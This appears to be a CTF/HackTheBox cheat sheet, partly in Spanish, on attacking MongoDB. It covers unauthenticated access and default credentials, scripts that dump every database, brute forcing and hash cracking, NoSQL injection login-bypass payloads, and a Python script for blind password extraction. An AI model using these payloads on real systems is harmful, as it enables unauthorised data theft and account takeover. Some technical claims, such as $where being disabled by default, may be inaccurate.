> **MongoDB** is a NoSQL document database that runs on **port 27017** (also 27018 for shard servers, 27019 for config servers). By default it has **no authentication**, making it a high-value target for data exfiltration and NoSQL injection in CTFs.

---

## Quickstart — Unauthenticated Access

```bash
# Connect to MongoDB without credentials
$ mongosh mongodb://10.129.1.10:27017
test> show dbs
test> use admin
test> show collections

# Legacy mongo shell (deprecated but still common on older boxes)
$ mongo 10.129.1.10:27017
> show dbs
```

**If you get an authentication error, try common defaults:**
```bash
mongosh mongodb://admin:admin@10.129.1.10:27017
mongosh mongodb://root:root@10.129.1.10:27017
mongosh mongodb://mongodb:mongodb@10.129.1.10:27017
```

---

## Mongo Shell (`mongo`) — Legacy CLI

El shell legacy `mongo` fue la herramienta CLI estándar de MongoDB hasta la versión 4.4. A partir de MongoDB 5.0 fue **deprecado** y reemplazado por `mongosh`. Sin embargo, es **extremadamente común encontrarlo en máquinas CTF/HTB** porque muchas corren versiones antiguas de MongoDB (3.x, 4.x).

### `mongo` vs `mongosh` — Diferencias clave

| Característica | `mongo` (legacy) | `mongosh` (moderno) |
| :------------ | :--------------- | :------------------ |
| **Motor JS** | SpiderMonkey (Mozilla) | Node.js (V8) |
| **Sintaxis** | JavaScript plano | JavaScript + Node.js APIs |
| **Output** | Texto plano | Coloreado, interactivo |
| **Autocompletado** | Limitado | Avanzado (Tab) |
| **Conexión** | `mongo <host>:<port>/<db>` | `mongosh mongodb://<host>:<port>/<db>` |
| **Incluido con** | MongoDB Server ≤ 4.4 | MongoDB Server ≥ 5.0 (puede conectarse a cualquier versión) |
| **Paquete Debian** | `mongodb-clients` | `mongodb-mongosh` |

> ✅ **Regla práctica:** `mongosh` puede conectarse a **cualquier versión** de servidor MongoDB (incluso 3.x). La tabla anterior indica con qué versión del servidor se distribuía cada herramienta. Si encuentras una instancia MongoDB 3.x o 4.x en una máquina CTF, puedes usar `mongo` (si está instalado) o `mongosh`. En Kali/Parrot, instala ambos con `sudo apt install mongodb-clients mongodb-mongosh`.

### Conexión con `mongo`

```bash
# Conexión básica (sin auth)
$ mongo 10.129.1.10:27017

# Conectar a una base de datos específica
$ mongo 10.129.1.10:27017/admin
$ mongo 10.129.1.10:27017/sensitive_information

# Con credenciales (flag --authenticationDatabase)
$ mongo -u admin -p admin 10.129.1.10:27017/admin
$ mongo -u root -p root --authenticationDatabase admin 10.129.1.10:27017

# Conexión silenciosa (sin banner)
$ mongo --quiet 10.129.1.10:27017

# Ejecutar un comando y salir (--eval)
$ mongo 10.129.1.10:27017 --eval 'db.adminCommand({listDatabases: 1})'
$ mongo --quiet 10.129.1.10:27017 --eval 'printjson(db.version())'
```

### Enumeración básica con `mongo`

```bash
$ mongo 10.129.1.10:27017

# Listar bases de datos
> show dbs
> db.adminCommand({listDatabases: 1})

# Cambiar de base de datos
> use admin
> use sensitive_information

# Mostrar la base de datos actual
> db
> db.getName()

# Listar colecciones
> show collections
> db.getCollectionNames()

# Ver la versión del servidor
> db.version()

# Info del servidor
> db.serverStatus()
> db.hostInfo()
> db.serverBuildInfo()
```

### Dumpear datos con `mongo`

```bash
# Dentro del shell interactivo
> use sensitive_information
> db.getCollectionNames()
> db.flag.find().pretty()
> db.users.find().pretty()

# Con --eval (una línea, sin interactuar)
$ mongo 10.129.1.10:27017/sensitive_information --eval 'db.flag.find().forEach(printjson)'
$ mongo 10.129.1.10:27017/sensitive_information --eval 'db.users.find().forEach(printjson)'

# Dumpear TODAS las colecciones de TODAS las bases de datos
$ mongo --quiet 10.129.1.10:27017 --eval '
  db.adminCommand({listDatabases: 1}).databases.forEach(function(d) {
    print("=== " + d.name + " ===");
    var dbObj = db.getSiblingDB(d.name);
    dbObj.getCollectionNames().forEach(function(c) {
      print("  --- " + c + " ---");
      dbObj.getCollection(c).find().forEach(printjson)
    })
  })
'
```

### Autenticación con `mongo`

```bash
# Desde el shell interactivo
> use admin
> db.auth("admin", "admin")
> db.auth("root", "toor")

# Ver usuarios autenticados
> db.runCommand({connectionStatus: 1})

# Listar usuarios del sistema
> use admin
> db.system.users.find().pretty()
```

### `mongo` — Comandos útiles adicionales

```bash
# Formatear salida como JSON legible
> db.flag.find().forEach(printjson)

# Contar documentos
> db.users.count()              # legacy (deprecado)
> db.users.find().count()        # alternativo
> db.users.countDocuments()     # MongoDB ≥ 4.0

# Ver índices
> db.users.getIndexes()

# Exportar a archivo desde el shell (redirección)
$ mongo --quiet 10.129.1.10:27017/sensitive_information \
    --eval 'db.flag.find().forEach(printjson)' > flag.json
```

> ⚠️ **Nota:** `mongo` fue eliminado en MongoDB 6.0. Si `mongosh` no está disponible en la máquina atacante, instálalo con `sudo apt install mongodb-clients` (Kali/Debian) o `yay -S mongodb-bin` (Arch).

---

## Basic Enumeration

```bash
$ mongosh mongodb://10.129.1.10:27017

# List all databases
test> show dbs
test> db.adminCommand({ listDatabases: 1 })

# Switch to a database
test> use admin
test> use sensitive_information
test> use users

# List collections in current database
test> show collections
test> db.getCollectionNames()

# Show current database
test> db.getName()
```

### Database & Collection Discovery

```bash
# List all databases programmatically
test> db.adminCommand({ listDatabases: 1 })

# Show all collections across all databases
test> var dbs = db.adminCommand({ listDatabases: 1 }).databases
test> dbs.forEach(function(d) { print("--- " + d.name + " ---"); db.getSiblingDB(d.name).getCollectionNames().forEach(function(c) { print(c) }) })
```

---

## Data Exfiltration

### Dump entire collections

```bash
# Switch to the target DB and dump
test> use sensitive_information
sensitive_information> db.getCollectionNames()
sensitive_information> db.flag.find().pretty()
sensitive_information> db.users.find().pretty()

# Count documents
sensitive_information> db.users.countDocuments()
sensitive_information> db.users.estimatedDocumentCount()

# Find specific documents
sensitive_information> db.users.findOne()
sensitive_information> db.users.find({ role: "admin" }).pretty()
sensitive_information> db.users.find({}, { password: 1, username: 1 }).pretty()
```

### Export data via mongoexport (if installed)

```bash
# Export entire collection as JSON
$ mongoexport --host 10.129.1.10 --port 27017 --db sensitive_information --collection flag --out flag.json
$ mongoexport --host 10.129.1.10 --port 27017 --db users --collection users --out users.json

# Export with query filter
$ mongoexport --host 10.129.1.10 --port 27017 --db admin --collection users -q '{"role":"admin"}' --out admins.json
```

### Full database dump via mongodump

```bash
# Dump all databases (requires mongodump — part of mongodb-database-tools)
$ mongodump --host 10.129.1.10 --port 27017 --out ./mongodb-dump/

# Dump a specific database
$ mongodump --host 10.129.1.10 --port 27017 --db sensitive_information --out ./dump/

# Dump a specific collection
$ mongodump --host 10.129.1.10 --port 27017 --db sensitive_information --collection flag --out ./dump/

# The output is BSON — use bsondump to convert to JSON
$ bsondump dump/sensitive_information/flag.bson > flag.json

# Or restore to a local MongoDB instance for easy querying
$ mongorestore --host localhost --port 27017 --dir ./mongodb-dump/
```

---

## MongoDB Commands Cheat Sheet

### Database Operations

| Command | What it does |
| :------ | :----------- |
| `show dbs` | List all databases |
| `use <db>` | Switch to / create a database |
| `db` | Show current database name |
| `db.getName()` | Same as `db` |
| `db.dropDatabase()` | Delete current database |
| `db.stats()` | Database statistics (size, objects, indexes) |
| `db.adminCommand({ listDatabases: 1 })` | Programmatic DB listing |

### Collection Operations

| Command | What it does |
| :------ | :----------- |
| `show collections` | List collections in current DB |
| `db.getCollectionNames()` | Same as above, returns array |
| `db.getCollectionInfos()` | Detailed collection metadata |
| `db.createCollection("name")` | Create a collection |
| `db.<collection>.drop()` | Delete a collection |
| `db.<collection>.stats()` | Collection statistics |
| `db.<collection>.renameCollection("new")` | Rename a collection |

### CRUD — Reading Data

| Command | What it does |
| :------ | :----------- |
| `db.<col>.find().pretty()` | Dump all documents (pretty-printed) |
| `db.<col>.findOne()` | Return the first document |
| `db.<col>.find({key: "value"})` | Filter by field |
| `db.<col>.find({}, {field: 1})` | Project only specific fields |
| `db.<col>.find().limit(10)` | Limit results |
| `db.<col>.find().sort({_id: -1})` | Sort results |
| `db.<col>.find().skip(5)` | Skip N results (pagination) |
| `db.<col>.countDocuments()` | Count documents (accurate) |
| `db.<col>.estimatedDocumentCount()` | Count documents (fast, metadata-based) |
| `db.<col>.distinct("field")` | List unique values for a field |
| `db.<col>.find({$where: "this.field == 'X'"})` | JavaScript expression filter (⚠️ risky) |

### CRUD — Writing Data (if you have write access)

| Command | What it does |
| :------ | :----------- |
| `db.<col>.insertOne({key: "val"})` | Insert one document |
| `db.<col>.insertMany([{...}, {...}])` | Insert multiple documents |
| `db.<col>.updateOne({q}, {$set: {k: v}})` | Update one document |
| `db.<col>.updateMany({q}, {$set: {k: v}})` | Update all matching documents |
| `db.<col>.deleteOne({key: "val"})` | Delete one document |
| `db.<col>.deleteMany({})` | Delete ALL documents in collection |

### Authentication & User Management

| Command | What it does |
| :------ | :----------- |
| `db.auth("user", "pass")` | Authenticate to current DB |
| `show users` | List users in current database |
| `db.getUsers()` | Same as above, returns array |
| `db.getRoles({showPrivileges: true})` | Show roles and their privileges |
| `db.changeUserPassword("user", "new")` | Change user password |
| `db.createUser({user: "x", pwd: "y", roles: [...]})` | Create a user |
| `db.dropUser("user")` | Delete a user |

### Server & System Info

| Command | What it does |
| :------ | :----------- |
| `db.version()` | MongoDB server version |
| `db.serverStatus()` | Full server statistics (useful!) |
| `db.hostInfo()` | Host OS, CPU, memory info |
| `db.serverBuildInfo()` | Build details (compiler, OpenSSL version) |
| `db.runCommand({connectionStatus: 1})` | Show authenticated user info |
| `db.runCommand({buildInfo: 1})` | Same as `db.serverBuildInfo()` |
| `db.currentOp()` | Currently running operations |
| `db.killOp(<opid>)` | Kill an operation |
| `db.shutdownServer()` | Shut down the MongoDB server |
| `db.runCommand({isMaster: 1})` | Replica set status |

### Admin Commands

```bash
# These typically require admin privileges
test> use admin

# List all databases
admin> db.adminCommand({ listDatabases: 1 })

# Get server status
admin> db.runCommand({ serverStatus: 1 })

# List all users on the server
admin> db.system.users.find().pretty()

# Get replica set config
admin> rs.conf()
admin> rs.status()
```

---

## Useful Nmap Scripts

```bash
# Detect MongoDB + enumerate databases
nmap --script mongodb-databases -p27017 10.129.1.10

# List MongoDB info
nmap --script mongodb-info -p27017 10.129.1.10

# Brute force MongoDB credentials
nmap --script mongodb-brute -p27017 10.129.1.10
```

### What mongodb-databases output looks like

```
PORT      STATE SERVICE
27017/tcp open  mongod
| mongodb-databases:
|   ok = 1.0
|   databases
|     4
|       name = users
|       empty = false
|       sizeOnDisk = 32768.0
|     2
|       name = local
|       empty = false
|       sizeOnDisk = 73728.0
|     3
|       name = sensitive_information
|       empty = false
|       sizeOnDisk = 32768.0
|     0
|       name = admin
|       empty = false
|       sizeOnDisk = 32768.0
|     1
|       name = config
|       empty = false
|       sizeOnDisk = 73728.0
|_  totalSize = 245760.0
```

> ✅ This is the single most useful nmap script for MongoDB — it dumps all database names and sizes without even authenticating.

---

## MongoDB Authentication Bypass

### Try default / empty credentials first

```bash
# Try common default credentials
$ mongosh mongodb://admin:admin@10.129.1.10:27017/admin
$ mongosh mongodb://root:root@10.129.1.10:27017/admin
$ mongosh mongodb://mongodb:mongodb@10.129.1.10:27017/admin
$ mongosh mongodb://mongod:mongod@10.129.1.10:27017/admin

# Try empty password
$ mongosh mongodb://admin:@10.129.1.10:27017/admin
$ mongosh mongodb://root:@10.129.1.10:27017/admin
```

### Check authentication mechanism

```bash
# In mongosh, after connecting
test> db.runCommand({buildInfo: 1}).version
3.6.8    # <-- version matters for exploit selection

# Try to authenticate and observe the error
test> db.auth("admin", "wrongpass")
# MongoDB < 3.0: MONGODB-CR (MD5, crackable offline)
# MongoDB ≥ 3.0: SCRAM-SHA-1 or SCRAM-SHA-256
```

### Brute force MONGODB-CR hashes (MongoDB < 3.0)

```bash
# If you capture a MONGODB-CR auth challenge (via network sniffing or db.system.users):
# The hash format is: md5(username + ":mongo:" + password)

# Crack with hashcat (mode 5500)
$ hashcat -m 5500 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Or brute force directly with hydra
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt mongodb://10.129.1.10
```

> ⚠️ SCRAM-SHA-1/256 (MongoDB ≥ 3.0) is salted and iterated — offline cracking is impractical. Focus on default credentials and brute forcing.

---

## Exploitation — Data Dump Automation

### One-liner — Dump all databases with mongosh

```bash
mongosh mongodb://10.129.1.10:27017 --eval '
  var dbs = db.adminCommand({listDatabases: 1}).databases;
  dbs.forEach(function(d) {
    print("=== " + d.name + " ===");
    var dbObj = db.getSiblingDB(d.name);
    dbObj.getCollectionNames().forEach(function(c) {
      print("  [" + c + "]");
      dbObj.getCollection(c).find().forEach(printjson)
    })
  })
'
```

### Scripted dump — discover DBs then export collections

```bash
# First, discover collection names via mongosh, then export with mongoexport
$ mongosh mongodb://10.129.1.10:27017 --quiet --eval '
  var dbs = db.adminCommand({listDatabases: 1}).databases;
  dbs.forEach(function(d) {
    var dbObj = db.getSiblingDB(d.name);
    dbObj.getCollectionNames().forEach(function(c) {
      print(d.name + ":" + c)
    })
  })
' | while IFS=: read -r db col; do
  echo "Exporting $db.$col..."
  mongoexport --host 10.129.1.10 --port 27017 --db "$db" --collection "$col" --out "dump_${db}_${col}.json" 2>/dev/null
done
```

### Dump all collections with legacy `mongo` shell

```bash
# Dumpear TODAS las colecciones de TODAS las bases de datos con mongo
$ mongo --quiet 10.129.1.10:27017 --eval '
  db.adminCommand({listDatabases: 1}).databases.forEach(function(d) {
    print("=== " + d.name + " ===");
    var dbObj = db.getSiblingDB(d.name);
    dbObj.getCollectionNames().forEach(function(c) {
      print("  --- " + c + " ---");
      dbObj.getCollection(c).find().forEach(printjson)
    })
  })
' > full_dump.json

# Dumpear una sola colección
$ mongo --quiet 10.129.1.10:27017/sensitive_information \
    --eval 'db.flag.find().forEach(printjson)' > flag.json

# Dumpear con filtro
$ mongo --quiet 10.129.1.10:27017/admin \
    --eval 'db.system.users.find().forEach(printjson)' > users.json
```

> 💡 `--quiet` suprime el banner de conexión y los mensajes del shell, dejando solo la salida de `printjson`. Ideal para redirigir a archivo.

---

## NoSQL Injection — Web App Exploitation

Many web apps use MongoDB as a backend and are vulnerable to NoSQL injection when user input is passed unsanitized into `$where`, `$regex`, or query operators.

### Authentication Bypass — The Classic `$gt` Trick

If the login query looks like:
```js
db.users.findOne({ username: req.body.user, password: req.body.pass })
```

Then sending JSON or URL-encoded objects instead of strings bypasses the check:

```bash
# JSON POST — $gt (greater than) matches everything except null/undefined
$ curl -X POST http://10.129.1.10/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# URL-encoded (PHP-style apps)
$ curl -X POST http://10.129.1.10/login \
  -d 'username[$gt]=&password[$gt]='

# Alternative operators
# $ne (not equal) — matches anything that isn't the given value
-d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# $regex — blind regex matching
-d '{"username": {"$regex": "^admin"}, "password": {"$gt": ""}}'
-d '{"username": {"$regex": "^.{1,}$"}, "password": {"$gt": ""}}'
```

### Password Extraction via `$regex` (Blind NoSQL Injection)

If you know a valid username, you can extract the password character by character:

```bash
# Test if password starts with 'a'
$ curl -X POST http://10.129.1.10/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": "^a"}}'
# If login succeeds → password starts with 'a'

# Automate extraction with a script
$ cat > nosql-brute.py << 'EOF'
import requests
import string
import re

url = "http://10.129.1.10/login"
headers = {"Content-Type": "application/json"}
password = ""
charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"

while True:
    found = False
    for c in charset:
        payload = {"username": "admin", "password": {"$regex": f"^{re.escape(password)}{re.escape(c)}"}}
        r = requests.post(url, json=payload, headers=headers)
        if "Welcome" in r.text or r.status_code == 302:  # adjust success check
            password += c
            found = True
            print(f"[+] Found: {password}")
            break
    if not found:
        break

print(f"[✓] Password: {password}")
EOF
$ python3 nosql-brute.py
```

### Data Extraction via `$where`

If the app uses `$where` with unsanitized input, you can enumerate data blindly:

```bash
# Boolean-based — test if admin's password length is 8
-d '{"search": {"$where": "this.password.length == 8"}}'

# Time-based — if the password starts with 'a', sleep 5 seconds
-d '{"search": {"$where": "if (this.password[0] == '\''a'\'') sleep(5000); return true"}}'
```

### Tools for NoSQL Injection

```bash
# NoSQLMap — automated NoSQL injection & exploitation
$ git clone https://github.com/codingo/NoSQLMap
$ cd NoSQLMap && python3 nosqlmap.py

# nosqli — modern NoSQL injection CLI tool (requires Go)
$ git clone https://github.com/Charlie-belmer/nosqli
$ cd nosqli && go build && ./nosqli scan -u http://10.129.1.10/login
```

> ⚠️ NoSQL injection payloads are case-sensitive. `$GT` won't work — it must be `$gt`.
> ⚠️ `$where` (and all server-side JavaScript) is **disabled by default** in MongoDB ≥ 4.4 (`security.javascriptEnabled: false`). If the target runs a recent version, focus on `$regex` and `$gt`/`$ne` operator injection instead.

---

## MongoDB Network & Configuration Enumeration

### Check if MongoDB is bound to external interfaces

```bash
# From the MongoDB shell
test> db.runCommand({serverStatus: 1}).host
test> db.serverStatus().process  # shows bound IP

# From the OS (if you have a shell)
$ ss -tlnp | grep 27017
$ netstat -tlnp | grep 27017
$ cat /etc/mongod.conf | grep bindIp
```

### Read MongoDB config via shell

```bash
test> db.runCommand({getCmdLineOpts: 1})
test> db.adminCommand({getParameter: "*"})
```

### Interesting parameters to look for

```bash
# Auth settings
test> db.adminCommand({getParameter: 1, authenticationMechanisms: 1})
test> db.adminCommand({getParameter: 1, authorization: 1})

# Network
test> db.adminCommand({getParameter: 1, net: 1})

# Security
test> db.adminCommand({getParameter: 1, sslMode: 1})
test> db.adminCommand({getParameter: 1, auditAuthorizationSuccess: 1})
```

---

## MongoDB Security Notes

- **No auth by default** — MongoDB ≤ 3.6 ships with `authorization: disabled` in `/etc/mongod.conf`
- `bindIp` defaults to `127.0.0.1` in newer versions, but many admins change it to `0.0.0.0` and forget to enable auth
- **No encryption by default** — data at rest and in transit is plaintext unless TLS is explicitly configured
- MongoDB 3.0+ uses SCRAM-SHA-1 for auth; older versions use MONGODB-CR (MD5-based, weaker)
- `--auth` flag or `security.authorization: enabled` in config enables authentication
- The `admin` database stores user credentials in `admin.system.users`
- **MongoDB Atlas** (cloud) enforces auth — this only applies to self-hosted instances
- ⚠️ **Never expose MongoDB to the internet without auth** — Shodan regularly indexes thousands of open instances

### Dangerous functions (restricted by default in newer versions)

| Function | Danger |
| :------- | :----- |
| `db.shutdownServer()` | Denial of service |
| `db.dropDatabase()` | Destroys current database |
| `$where` operator | Allows arbitrary JavaScript execution |
| `mapReduce` / `group` | Can execute arbitrary JavaScript |
| `eval` (deprecated) | Executes arbitrary JavaScript on server |

> JavaScript execution in MongoDB (`$where`, `mapReduce`, `group`) is sandboxed and NOT a reliable RCE vector in modern versions (≥ 3.0). On very old MongoDB (< 2.4), the V8 engine lacked the `--disable-in-process-stack-traces` flag, enabling sandbox escapes — but you're unlikely to encounter this on HTB. Focus on data exfiltration and credential harvesting.

---

## Automation & One-liners

### Quick port detection

```bash
# Check if port 27017 is open
nc -zv 10.129.1.10 27017

# Basic nmap check
nmap -sV -p27017 10.129.1.10
```

### Dump all data without installing mongoexport

```bash
# Using mongosh (installed via mongosh package)
mongosh mongodb://10.129.1.10:27017 --quiet --eval '
  var dbs = db.adminCommand({listDatabases: 1}).databases;
  dbs.forEach(function(d) {
    var dbObj = db.getSiblingDB(d.name);
    dbObj.getCollectionNames().forEach(function(c) {
      dbObj.getCollection(c).find().forEach(function(doc) {
        print(JSON.stringify(doc))
      })
    })
  })
'
```

### One-liner — nmap quick enum

```bash
nmap -sV -p27017 --script mongodb-databases,mongodb-info 10.129.1.10
```

### Brute force with hydra

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt mongodb://10.129.1.10
```

### Extract version info in one command

```bash
mongosh mongodb://10.129.1.10:27017 --eval 'print(db.version())' --quiet
```

---

## CTF / HTB Workflow Checklist

1. **Scan port** — `nmap -sV -p27017 --script mongodb-databases 10.129.1.10`
2. **Check auth** — `mongosh mongodb://10.129.1.10:27017` → if you get a prompt, no auth needed
3. **Enumerate DBs** — `show dbs`
4. **Switch to interesting DB** — `use sensitive_information`
5. **List collections** — `show collections` / `db.getCollectionNames()`
6. **Dump data** — `db.flag.find().pretty()` / `db.users.find().pretty()`
7. **Check version** — `db.version()` (for known CVEs)
8. **Export data** — `mongoexport --host 10.129.1.10 --port 27017 --db <db> --collection <col> --out dump.json`

---

## Installing mongosh / mongo / mongodump

```bash
# Debian/Ubuntu/Kali — install mongosh (modern shell)
$ sudo apt install mongodb-mongosh

# Debian/Ubuntu/Kali — install legacy mongo shell + tools (mongodump, mongoexport, etc.)
$ sudo apt install mongodb-clients

# Arch Linux
$ yay -S mongosh-bin          # mongosh (modern)
$ yay -S mongodb-bin           # mongo (legacy)
$ yay -S mongodb-tools-bin     # mongodump, mongoexport, bsondump, etc.

# Or download mongosh binary directly
$ wget https://downloads.mongodb.com/compass/mongosh-2.4.0-linux-x64.tgz
$ tar xzf mongosh-*.tgz && sudo cp mongosh-*/bin/mongosh /usr/local/bin/
```

---

## References

- [MongoDB Official Documentation](https://www.mongodb.com/docs/manual/)
- [HackTricks — Pentesting MongoDB (27017)](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb)
- [MongoDB Security Checklist](https://www.mongodb.com/docs/manual/administration/security-checklist/)
- [Nmap NSE — mongodb-databases](https://nmap.org/nsedoc/scripts/mongodb-databases.html)
- [Nmap NSE — mongodb-info](https://nmap.org/nsedoc/scripts/mongodb-info.html)
- [MongoDB NoSQL Injection](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)
